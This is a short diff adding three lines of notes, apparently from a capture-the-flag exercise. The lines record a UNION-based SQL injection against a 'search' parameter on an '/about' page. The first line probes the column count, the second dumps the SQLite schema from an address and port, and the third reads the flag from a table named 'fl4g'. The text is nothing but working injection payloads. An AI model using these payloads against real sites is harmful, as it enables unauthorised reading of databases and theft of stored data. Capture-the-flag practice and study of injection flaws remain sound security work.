@@ -1,0 +1,3 @@
+- GET /about?search='+union+select+1,+'a',+'b',+4,+99-- => 5 columns (int, string, string, int, int)
+- http://34.143.130.87:4002/about?search=a%27+union+select+1,(SELECT+sql+FROM+sqlite_schema),3,4,5--+aaa
+- search=a%27+union+select+1,(select+flag+from+fl4g),3,4,5--+aaa
